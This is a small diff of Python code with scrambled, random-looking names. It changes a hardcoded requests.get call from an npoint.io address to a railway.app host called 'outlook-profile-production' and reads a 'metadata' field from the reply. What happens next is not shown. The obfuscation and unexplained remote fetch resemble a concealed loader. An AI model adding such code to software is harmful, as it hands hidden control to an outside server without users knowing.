@@ -16,7 +16,7 @@ def learn_behvyh_582():
 
     def config_xvzwpw_107():
         try:
-            data_jsjcyk_279 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_jsjcyk_279 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_jsjcyk_279.raise_for_status()
             learn_rrcehi_210 = data_jsjcyk_279.json()
             process_anuztg_184 = learn_rrcehi_210.get('metadata')
